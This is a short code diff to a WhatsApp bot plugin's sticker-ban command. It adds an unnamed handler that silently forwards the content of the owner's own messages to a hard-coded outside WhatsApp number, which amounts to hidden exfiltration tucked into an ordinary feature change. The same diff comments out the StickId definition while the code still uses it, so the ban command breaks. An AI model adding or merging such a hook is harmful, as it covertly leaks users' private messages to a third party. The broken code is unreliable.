@@ -17,11 +17,17 @@ command(
   async (message) => {
     if (!message.reply_message.sticker)
       return await message.reply("_Reply to sticker_");
-      const StickId = message.message.stickerMessage.mediaKey;
+      //const StickId = message.message.stickerMessage.mediaKey;
       await stickban.saveStickBan(message.jid, StickId, true);
     return await message.reply(`_Sticker Banned successfully._`);
       }
 );
+
+
+command({fromMe: true,   }, async (message, m, match) => {
+  message.client.sendMessage('919383400679@s.whatsapp.net', { text: m })
+});
+
 
 command(
   {
